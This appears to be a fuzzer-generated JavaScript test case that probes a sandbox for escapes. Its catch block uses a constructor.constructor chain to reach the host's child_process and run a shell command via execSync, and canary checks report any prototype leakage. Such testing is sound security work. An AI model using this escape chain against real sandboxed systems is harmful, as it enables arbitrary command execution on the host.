try {
    class Foo {
        constructor(arg) {
            let REPLACER = 23;
            this.arg = arg;
        }
    }
    var FooTarget = new Proxy(Foo, {});
    var FooProxy = new Proxy(FooTarget, { construct: null });
    var foo = new FooProxy(1);
    assert(foo instanceof Foo);
    assert.sameValue(foo.arg, 1);
    class Bar extends Foo {
        get isBar() {
            throw () => {
                return () => {
                };
            };
            return true;
        }
    }
    var bar = Reflect.construct(FooProxy, [2], Bar);
    assert(bar instanceof Bar);
    assert.sameValue(bar.arg, 2);
    assert(bar.isBar);
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}